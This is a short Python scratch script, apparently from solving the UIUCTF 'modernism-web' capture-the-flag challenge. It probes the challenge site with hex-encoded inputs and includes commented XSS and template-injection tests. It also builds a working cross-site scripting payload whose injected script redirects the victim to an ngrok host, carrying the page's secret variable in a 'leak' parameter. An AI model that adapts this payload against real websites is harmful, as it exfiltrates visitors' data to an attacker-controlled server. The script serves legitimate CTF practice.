import requests

s = requests.Session()

URL="https://modernism-web.chal.uiuc.tf"

# default = "uiuctf{FAKEFLAG}".encode()
# print(default)

import binascii
# # str_val = '<script>alert(1);</script> '.encode('utf-8')
# str_val = '{{7*7}} '.encode('utf-8')
# hex_val = binascii.hexlify(str_val).decode('utf-8')
# print(hex_val)

# payload = {
#     "p": hex_val
# }
# res = s.get(URL, params=payload)
# print(res.text)

import binascii
str_val = 'A quick brown fox'.encode('utf-8')
hex_val = binascii.hexlify(str_val).decode('utf-8')
print(hex_val)
print(bytes.fromhex(hex_val))

print(bytes.fromhex("fffe7600610072002000"))
payload="""
<script src="https://modernism-web.chal.uiuc.tf/?p=fffe7600610072002000"><script>location.href="https://1ed8-111-98-254-197.jp.ngrok.io/?leak="+escape(Object.keys(window).pop());</script>
"""

res = requests.get(URL, params={
    "p": "fffe7600610072002000",
})
print(res.text)

import urllib.parse
url = "%u6975%u6375%u6674%u467B%u4B41%u4645%u414C%u7D47"
urllib.parse.unquote(url)
print(url)